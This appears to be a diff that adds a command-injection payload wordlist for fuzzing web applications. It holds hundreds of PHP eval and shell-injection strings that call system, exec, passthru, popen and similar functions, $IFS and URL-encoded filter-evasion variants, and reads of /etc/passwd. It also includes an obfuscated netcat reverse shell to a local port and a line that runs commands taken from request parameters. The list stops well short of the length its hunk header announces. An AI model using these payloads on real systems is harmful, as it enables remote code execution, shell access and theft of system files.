@@ -1,0 +1,1234 @@
+$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
+$(`cat /etc/passwd`)
+$(`dir`)
+$(echo SYCGSY > SYCGSY.txt)
+${exec(print(`echo AOJPQW\necho $((18+92))\necho AOJPQW\necho AOJPQW`);%252529%25257DAOJPQW
+${exec(print(`echo ASBMQM;echo $((65+46));echo ASBMQM;echo ASBMQM`);#ASBMQM
+${exec(print(`echo BDBPSZ;echo $((87+50));echo BDBPSZ;echo BDBPSZ`);BDBPSZ
+${exec(print(`echo BGHSSE`.`echo $((10+79))`.`echo BGHSSE`.`echo BGHSSE`);."BGHSSE
+${exec(print(`echo CHWXXR;echo $((19+13));echo CHWXXR;echo CHWXXR`);.'CHWXXR
+${exec(print(`echo CPYIZR%0aecho $((58+63))%0aecho CPYIZR%0aecho CPYIZR`);//CPYIZR
+${exec(print(`echo GKZRWD`.`echo $((93+76))`.`echo GKZRWD`.`echo GKZRWD`);#GKZRWD
+${exec(print(`echo GYABGY;echo $((9+52));echo GYABGY;echo GYABGY`);."GYABGY
+${exec(print(`echo HFMDNB%0aecho $((56+41))%0aecho HFMDNB%0aecho HFMDNB`);.%2522HFMDNB
+${exec(print(`echo HIUMZJ`.`echo $((69+37))`.`echo HIUMZJ`.`echo HIUMZJ`);HIUMZJ
+${exec(print(`echo IHGVIP;echo $((98+57));echo IHGVIP;echo IHGVIP`);)}IHGVIP
+${exec(print(`echo ITAGSP\necho $((63+35))\necho ITAGSP\necho ITAGSP`);ITAGSP
+${exec(print(`echo JFZDGZ`.`echo $((16+38))`.`echo JFZDGZ`.`echo JFZDGZ`);\\JFZDGZ
+${exec(print(`echo JPKQMC\necho $((63+12))\necho JPKQMC\necho JPKQMC`);.%252527JPKQMC
+${exec(print(`echo KTGGNJ\necho $((80+87))\necho KTGGNJ\necho KTGGNJ`);.%252522KTGGNJ
+${exec(print(`echo LWNHYJ%0aecho $((0+21))%0aecho LWNHYJ%0aecho LWNHYJ`);%2529%257DLWNHYJ
+${exec(print(`echo OHFTIA%0aecho $((97+31))%0aecho OHFTIA%0aecho OHFTIA`);.%2527OHFTIA
+${exec(print(`echo QRLVMM\necho $((41+19))\necho QRLVMM\necho QRLVMM`);%25255C%25255CQRLVMM
+${exec(print(`echo QTLCRD%0aecho $((90+5))%0aecho QTLCRD%0aecho QTLCRD`);%255C%255CQTLCRD
+${exec(print(`echo SRPMSX`.`echo $((59+33))`.`echo SRPMSX`.`echo SRPMSX`))}SRPMSX
+${exec(print(`echo TWZNTZ\necho $((85+67))\necho TWZNTZ\necho TWZNTZ`);%252523TWZNTZ
+${exec(print(`echo UFJNMU\necho $((69+30))\necho UFJNMU\necho UFJNMU`);//UFJNMU
+${exec(print(`echo UGDXMC`.`echo $((12+69))`.`echo UGDXMC`.`echo UGDXMC`);.'UGDXMC
+${exec(print(`echo UVBBNB%0aecho $((5+32))%0aecho UVBBNB%0aecho UVBBNB`);UVBBNB
+${exec(print(`echo UZNHTA%0aecho $((79+41))%0aecho UZNHTA%0aecho UZNHTA`);%2523UZNHTA
+${exec(print(`echo XRESBN`.`echo $((9+10))`.`echo XRESBN`.`echo XRESBN`);//XRESBN
+${exec(print(`echo YFVAOJ;echo $((71+65));echo YFVAOJ;echo YFVAOJ`);//YFVAOJ
+${exec(print(`echo YYMYQB;echo $((54+65));echo YYMYQB;echo YYMYQB`);\\YYMYQB
+;{$_GET["cmd"]}
+$(`ls`)
+${passthru(print(`echo CGIUOF`.`echo $((1+49))`.`echo CGIUOF`.`echo CGIUOF`);\\CGIUOF
+${passthru(print(`echo CLQQRV;echo $((21+24));echo CLQQRV;echo CLQQRV`);CLQQRV
+${passthru(print(`echo CSYNWP\necho $((93+10))\necho CSYNWP\necho CSYNWP`);.%252522CSYNWP
+${passthru(print(`echo CYGOXX;echo $((41+31));echo CYGOXX;echo CYGOXX`);)}CYGOXX
+${passthru(print(`echo DAORGO`.`echo $((65+75))`.`echo DAORGO`.`echo DAORGO`))}DAORGO
+${passthru(print(`echo DBDIBN;echo $((7+5));echo DBDIBN;echo DBDIBN`);//DBDIBN
+${passthru(print(`echo EGTRQH\necho $((17+5))\necho EGTRQH\necho EGTRQH`);.%252527EGTRQH
+${passthru(print(`echo EWDATZ\necho $((58+44))\necho EWDATZ\necho EWDATZ`);//EWDATZ
+${passthru(print(`echo FHTLVG%0aecho $((8+87))%0aecho FHTLVG%0aecho FHTLVG`);%2523FHTLVG
+${passthru(print(`echo HRCXNG;echo $((6+10));echo HRCXNG;echo HRCXNG`);."HRCXNG
+${passthru(print(`echo JRXXWA;echo $((92+68));echo JRXXWA;echo JRXXWA`);\\JRXXWA
+${passthru(print(`echo KRUYIM%0aecho $((16+77))%0aecho KRUYIM%0aecho KRUYIM`);.%2522KRUYIM
+${passthru(print(`echo KXVPHA%0aecho $((20+43))%0aecho KXVPHA%0aecho KXVPHA`);%255C%255CKXVPHA
+${passthru(print(`echo NLYULT`.`echo $((55+80))`.`echo NLYULT`.`echo NLYULT`);NLYULT
+${passthru(print(`echo NSBWMT%0aecho $((16+44))%0aecho NSBWMT%0aecho NSBWMT`);//NSBWMT
+${passthru(print(`echo OAAISJ`.`echo $((72+52))`.`echo OAAISJ`.`echo OAAISJ`);#OAAISJ
+${passthru(print(`echo OLJESC\necho $((53+40))\necho OLJESC\necho OLJESC`);%25255C%25255COLJESC
+${passthru(print(`echo OSWWFT%0aecho $((92+42))%0aecho OSWWFT%0aecho OSWWFT`);%2529%257DOSWWFT
+${passthru(print(`echo OVSNXT\necho $((21+17))\necho OVSNXT\necho OVSNXT`);%252529%25257DOVSNXT
+${passthru(print(`echo PYELUB;echo $((29+64));echo PYELUB;echo PYELUB`);#PYELUB
+${passthru(print(`echo QKCAAG%0aecho $((61+22))%0aecho QKCAAG%0aecho QKCAAG`);.%2527QKCAAG
+${passthru(print(`echo QPYRBQ\necho $((35+79))\necho QPYRBQ\necho QPYRBQ`);%252523QPYRBQ
+${passthru(print(`echo RBCHID`.`echo $((71+83))`.`echo RBCHID`.`echo RBCHID`);.'RBCHID
+${passthru(print(`echo TYDNLL%0aecho $((23+29))%0aecho TYDNLL%0aecho TYDNLL`);TYDNLL
+${passthru(print(`echo UOUNQT`.`echo $((2+66))`.`echo UOUNQT`.`echo UOUNQT`);."UOUNQT
+${passthru(print(`echo XGEVDG`.`echo $((58+30))`.`echo XGEVDG`.`echo XGEVDG`);//XGEVDG
+${passthru(print(`echo XUWNEP;echo $((61+20));echo XUWNEP;echo XUWNEP`);.'XUWNEP
+${passthru(print(`echo ZKPFXS\necho $((3+17))\necho ZKPFXS\necho ZKPFXS`);ZKPFXS
+{${phpinfo()}}
+${popen(print(`echo AHQLIX%0aecho $((35+21))%0aecho AHQLIX%0aecho AHQLIX`);//AHQLIX
+${popen(print(`echo ATLEFF;echo $((90+9));echo ATLEFF;echo ATLEFF`);\\ATLEFF
+${popen(print(`echo BZEAYT%0aecho $((11+35))%0aecho BZEAYT%0aecho BZEAYT`);.%2527BZEAYT
+${popen(print(`echo BZLGPL;echo $((70+63));echo BZLGPL;echo BZLGPL`);)}BZLGPL
+${popen(print(`echo FJKMCS\necho $((43+2))\necho FJKMCS\necho FJKMCS`);.%252522FJKMCS
+${popen(print(`echo FRWTRM;echo $((11+41));echo FRWTRM;echo FRWTRM`);."FRWTRM
+${popen(print(`echo IWFPXG;echo $((92+70));echo IWFPXG;echo IWFPXG`);IWFPXG
+${popen(print(`echo JDFWVW%0aecho $((92+86))%0aecho JDFWVW%0aecho JDFWVW`);%255C%255CJDFWVW
+${popen(print(`echo KCHOPX\necho $((77+78))\necho KCHOPX\necho KCHOPX`);%252523KCHOPX
+${popen(print(`echo LBEVLL`.`echo $((2+31))`.`echo LBEVLL`.`echo LBEVLL`))}LBEVLL
+${popen(print(`echo LSIFOR%0aecho $((86+39))%0aecho LSIFOR%0aecho LSIFOR`);.%2522LSIFOR
+${popen(print(`echo MVEAQD;echo $((64+58));echo MVEAQD;echo MVEAQD`);.'MVEAQD
+${popen(print(`echo PBSYUK`.`echo $((49+23))`.`echo PBSYUK`.`echo PBSYUK`);//PBSYUK
+${popen(print(`echo PBZYGX`.`echo $((38+4))`.`echo PBZYGX`.`echo PBZYGX`);."PBZYGX
+${popen(print(`echo QDXUDJ\necho $((17+75))\necho QDXUDJ\necho QDXUDJ`);%252529%25257DQDXUDJ
+${popen(print(`echo RWKSAH%0aecho $((18+34))%0aecho RWKSAH%0aecho RWKSAH`);RWKSAH
+${popen(print(`echo RWZIYD\necho $((45+92))\necho RWZIYD\necho RWZIYD`);//RWZIYD
+${popen(print(`echo SLXBWN%0aecho $((29+57))%0aecho SLXBWN%0aecho SLXBWN`);%2529%257DSLXBWN
+${popen(print(`echo TBFYMH\necho $((44+94))\necho TBFYMH\necho TBFYMH`);TBFYMH
+${popen(print(`echo UQCXVD\necho $((60+78))\necho UQCXVD\necho UQCXVD`);%25255C%25255CUQCXVD
+${popen(print(`echo UWOAFS%0aecho $((11+42))%0aecho UWOAFS%0aecho UWOAFS`);%2523UWOAFS
+${popen(print(`echo UYCUPP;echo $((99+36));echo UYCUPP;echo UYCUPP`);//UYCUPP
+${popen(print(`echo VDXXJI;echo $((50+12));echo VDXXJI;echo VDXXJI`);#VDXXJI
+${popen(print(`echo VGNVLG`.`echo $((76+39))`.`echo VGNVLG`.`echo VGNVLG`);VGNVLG
+${popen(print(`echo XGFDZU`.`echo $((14+6))`.`echo XGFDZU`.`echo XGFDZU`);#XGFDZU
+${popen(print(`echo XZRRJD`.`echo $((95+86))`.`echo XZRRJD`.`echo XZRRJD`);.'XZRRJD
+${popen(print(`echo YYAFET`.`echo $((62+68))`.`echo YYAFET`.`echo YYAFET`);\\YYAFET
+${popen(print(`echo ZTPGAU\necho $((52+3))\necho ZTPGAU\necho ZTPGAU`);.%252527ZTPGAU
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+${proc_open(print(`echo BBSVGQ`.`echo $((42+81))`.`echo BBSVGQ`.`echo BBSVGQ`);#BBSVGQ
+${proc_open(print(`echo BPIHJI%0aecho $((94+16))%0aecho BPIHJI%0aecho BPIHJI`);%2523BPIHJI
+${proc_open(print(`echo BUFRZN`.`echo $((99+37))`.`echo BUFRZN`.`echo BUFRZN`);\\BUFRZN
+${proc_open(print(`echo CPKMZS`.`echo $((71+91))`.`echo CPKMZS`.`echo CPKMZS`);.'CPKMZS
+${proc_open(print(`echo EALLNU`.`echo $((18+91))`.`echo EALLNU`.`echo EALLNU`))}EALLNU
+${proc_open(print(`echo EBZMPW\necho $((54+99))\necho EBZMPW\necho EBZMPW`);.%252522EBZMPW
+${proc_open(print(`echo FCANMP\necho $((61+35))\necho FCANMP\necho FCANMP`);FCANMP
+${proc_open(print(`echo GSEIBK\necho $((71+35))\necho GSEIBK\necho GSEIBK`);%252529%25257DGSEIBK
+${proc_open(print(`echo HEDLVC%0aecho $((95+18))%0aecho HEDLVC%0aecho HEDLVC`);//HEDLVC
+${proc_open(print(`echo HWBQFG;echo $((79+43));echo HWBQFG;echo HWBQFG`);.'HWBQFG
+${proc_open(print(`echo JQUEEX\necho $((81+77))\necho JQUEEX\necho JQUEEX`);.%252527JQUEEX
+${proc_open(print(`echo JXTIWP%0aecho $((97+60))%0aecho JXTIWP%0aecho JXTIWP`);.%2522JXTIWP
+${proc_open(print(`echo KDOEOK`.`echo $((74+18))`.`echo KDOEOK`.`echo KDOEOK`);//KDOEOK
+${proc_open(print(`echo KNDTDG\necho $((98+53))\necho KNDTDG\necho KNDTDG`);//KNDTDG
+${proc_open(print(`echo KZLOGK`.`echo $((4+23))`.`echo KZLOGK`.`echo KZLOGK`);."KZLOGK
+${proc_open(print(`echo LUFXAF;echo $((85+77));echo LUFXAF;echo LUFXAF`);#LUFXAF
+${proc_open(print(`echo MLSOYZ;echo $((72+12));echo MLSOYZ;echo MLSOYZ`);."MLSOYZ
+${proc_open(print(`echo RMMUOG;echo $((61+62));echo RMMUOG;echo RMMUOG`);)}RMMUOG
+${proc_open(print(`echo RTNMAU;echo $((3+92));echo RTNMAU;echo RTNMAU`);//RTNMAU
+${proc_open(print(`echo SKXDUS;echo $((67+97));echo SKXDUS;echo SKXDUS`);\\SKXDUS
+${proc_open(print(`echo SQZPMJ%0aecho $((94+63))%0aecho SQZPMJ%0aecho SQZPMJ`);%255C%255CSQZPMJ
+${proc_open(print(`echo SRVISB\necho $((34+18))\necho SRVISB\necho SRVISB`);%252523SRVISB
+${proc_open(print(`echo TDPGNL%0aecho $((89+52))%0aecho TDPGNL%0aecho TDPGNL`);.%2527TDPGNL
+${proc_open(print(`echo TIYJYD`.`echo $((86+26))`.`echo TIYJYD`.`echo TIYJYD`);TIYJYD
+${proc_open(print(`echo TWETUM%0aecho $((82+35))%0aecho TWETUM%0aecho TWETUM`);%2529%257DTWETUM
+${proc_open(print(`echo WMSMFM%0aecho $((4+30))%0aecho WMSMFM%0aecho WMSMFM`);WMSMFM
+${proc_open(print(`echo XAKQYF;echo $((41+51));echo XAKQYF;echo XAKQYF`);XAKQYF
+${proc_open(print(`echo ZMUKGP\necho $((9+61))\necho ZMUKGP\necho ZMUKGP`);%25255C%25255CZMUKGP
+${shell_exec(print(`echo BMQBVJ;echo $((82+52));echo BMQBVJ;echo BMQBVJ`);.'BMQBVJ
+${shell_exec(print(`echo CKFBET`.`echo $((33+76))`.`echo CKFBET`.`echo CKFBET`);.'CKFBET
+${shell_exec(print(`echo CTGKDZ`.`echo $((66+54))`.`echo CTGKDZ`.`echo CTGKDZ`);//CTGKDZ
+${shell_exec(print(`echo CVXUUB\necho $((15+41))\necho CVXUUB\necho CVXUUB`);//CVXUUB
+${shell_exec(print(`echo DPVESG%0aecho $((76+66))%0aecho DPVESG%0aecho DPVESG`);%2529%257DDPVESG
+${shell_exec(print(`echo EDDLOS;echo $((48+73));echo EDDLOS;echo EDDLOS`);//EDDLOS
+${shell_exec(print(`echo EINNUI;echo $((9+15));echo EINNUI;echo EINNUI`);#EINNUI
+${shell_exec(print(`echo FBJSWR%0aecho $((91+71))%0aecho FBJSWR%0aecho FBJSWR`);%2523FBJSWR
+${shell_exec(print(`echo FDGAHQ`.`echo $((87+87))`.`echo FDGAHQ`.`echo FDGAHQ`);FDGAHQ
+${shell_exec(print(`echo HULCYO%0aecho $((33+24))%0aecho HULCYO%0aecho HULCYO`);//HULCYO
+${shell_exec(print(`echo KIACLJ%0aecho $((8+79))%0aecho KIACLJ%0aecho KIACLJ`);.%2522KIACLJ
+${shell_exec(print(`echo KRLQHL\necho $((37+53))\necho KRLQHL\necho KRLQHL`);%25255C%25255CKRLQHL
+${shell_exec(print(`echo LTJDND\necho $((85+41))\necho LTJDND\necho LTJDND`);LTJDND
+${shell_exec(print(`echo MVSQEI;echo $((38+17));echo MVSQEI;echo MVSQEI`);\\MVSQEI
+${shell_exec(print(`echo NHQIAE\necho $((63+50))\necho NHQIAE\necho NHQIAE`);.%252522NHQIAE
+${shell_exec(print(`echo NSLPBW`.`echo $((95+54))`.`echo NSLPBW`.`echo NSLPBW`);\\NSLPBW
+${shell_exec(print(`echo NTILFZ%0aecho $((24+1))%0aecho NTILFZ%0aecho NTILFZ`);NTILFZ
+${shell_exec(print(`echo OAPDKW;echo $((19+47));echo OAPDKW;echo OAPDKW`);OAPDKW
+${shell_exec(print(`echo OYNPCP;echo $((84+51));echo OYNPCP;echo OYNPCP`);)}OYNPCP
+${shell_exec(print(`echo PWWUEN`.`echo $((49+57))`.`echo PWWUEN`.`echo PWWUEN`))}PWWUEN
+${shell_exec(print(`echo QQZSXU\necho $((69+44))\necho QQZSXU\necho QQZSXU`);%252523QQZSXU
+${shell_exec(print(`echo RJFPQU\necho $((15+60))\necho RJFPQU\necho RJFPQU`);%252529%25257DRJFPQU
+${shell_exec(print(`echo SICOKB`.`echo $((59+30))`.`echo SICOKB`.`echo SICOKB`);#SICOKB
+${shell_exec(print(`echo VBRHZS\necho $((17+48))\necho VBRHZS\necho VBRHZS`);.%252527VBRHZS
+${shell_exec(print(`echo VEKGIY%0aecho $((15+47))%0aecho VEKGIY%0aecho VEKGIY`);.%2527VEKGIY
+${shell_exec(print(`echo VZXASO%0aecho $((97+88))%0aecho VZXASO%0aecho VZXASO`);%255C%255CVZXASO
+${shell_exec(print(`echo WBZBZE;echo $((19+87));echo WBZBZE;echo WBZBZE`);."WBZBZE
+${shell_exec(print(`echo ZEVNBY`.`echo $((97+49))`.`echo ZEVNBY`.`echo ZEVNBY`);."ZEVNBY
+ {${sleep(20)}}
+${system(print(`echo ARCVVC;echo $((7+90));echo ARCVVC;echo ARCVVC`);."ARCVVC
+${system(print(`echo CKLWBH%0aecho $((38+7))%0aecho CKLWBH%0aecho CKLWBH`);.%2522CKLWBH
+${system(print(`echo CPHTNC`.`echo $((73+50))`.`echo CPHTNC`.`echo CPHTNC`);\\CPHTNC
+${system(print(`echo CTDUTJ\necho $((30+48))\necho CTDUTJ\necho CTDUTJ`);CTDUTJ
+${system(print(`echo CZASPT\necho $((18+64))\necho CZASPT\necho CZASPT`);.%252522CZASPT
+${system(print(`echo DDVDPM%0aecho $((1+17))%0aecho DDVDPM%0aecho DDVDPM`);%2529%257DDDVDPM
+${system(print(`echo EDIEDW%0aecho $((27+90))%0aecho EDIEDW%0aecho EDIEDW`);EDIEDW
+${system(print(`echo EZFNSE;echo $((38+74));echo EZFNSE;echo EZFNSE`);)}EZFNSE
+${system(print(`echo FTPLBI;echo $((56+37));echo FTPLBI;echo FTPLBI`);.'FTPLBI
+${system(print(`echo GVUXPA;echo $((23+14));echo GVUXPA;echo GVUXPA`);\\GVUXPA
+${system(print(`echo IWAAGD\necho $((70+17))\necho IWAAGD\necho IWAAGD`);.%252527IWAAGD
+${system(print(`echo JJXLFR`.`echo $((84+45))`.`echo JJXLFR`.`echo JJXLFR`);//JJXLFR
+${system(print(`echo LHBYTT\necho $((48+0))\necho LHBYTT\necho LHBYTT`);%25255C%25255CLHBYTT
+${system(print(`echo LWTWCT;echo $((98+35));echo LWTWCT;echo LWTWCT`);#LWTWCT
+${system(print(`echo LXHYXF\necho $((50+90))\necho LXHYXF\necho LXHYXF`);//LXHYXF
+${system(print(`echo MAFXYF%0aecho $((23+63))%0aecho MAFXYF%0aecho MAFXYF`);//MAFXYF
+${system(print(`echo MQQJPG\necho $((72+19))\necho MQQJPG\necho MQQJPG`);%252523MQQJPG
+${system(print(`echo QIHVTW`.`echo $((76+48))`.`echo QIHVTW`.`echo QIHVTW`);QIHVTW
+${system(print(`echo QXZKBZ;echo $((59+25));echo QXZKBZ;echo QXZKBZ`);//QXZKBZ
+${system(print(`echo RKLPMM%0aecho $((66+91))%0aecho RKLPMM%0aecho RKLPMM`);.%2527RKLPMM
+${system(print(`echo RSGSZK%0aecho $((0+7))%0aecho RSGSZK%0aecho RSGSZK`);%2523RSGSZK
+${system(print(`echo TDEKPW`.`echo $((36+67))`.`echo TDEKPW`.`echo TDEKPW`);.'TDEKPW
+${system(print(`echo WJAMJI`.`echo $((95+52))`.`echo WJAMJI`.`echo WJAMJI`);."WJAMJI
+${system(print(`echo XPECBV`.`echo $((14+77))`.`echo XPECBV`.`echo XPECBV`);#XPECBV
+${system(print(`echo YHCDBT%0aecho $((19+19))%0aecho YHCDBT%0aecho YHCDBT`);%255C%255CYHCDBT
+${system(print(`echo YVOAMZ;echo $((9+69));echo YVOAMZ;echo YVOAMZ`);YVOAMZ
+${system(print(`echo YYSFAL\necho $((70+5))\necho YYSFAL\necho YYSFAL`);%252529%25257DYYSFAL
+${system(print(`echo ZYLUET`.`echo $((5+56))`.`echo ZYLUET`.`echo ZYLUET`))}ZYLUET
+$u/bin$u/cat$u $u/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+;+$u+cat+/etc$u/passwd$u
+$;/usr/bin/id
+%0a ls -la
+%0Acat /etc/passwd
+"%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+&&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+'%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+;%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+|%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+||%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
+"%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+"%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
+||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
+"%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+&&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+'%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+;%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+|%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+||%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
+"%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+&&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+'%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+;%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+|%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+||%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
+"%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+&&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+'%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+;%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+|%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+||%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
+"%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+&&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+'%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+;%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+|%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+||%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+"%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+&&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+'%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+;%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+|%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+||%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
+"%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+&&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+'%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+;%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+|%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+||%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
+"%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+&&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+'%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+;%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+|%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+||%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
+"%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+"%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
+||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
+"%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+&&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+;%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+|%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+||%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
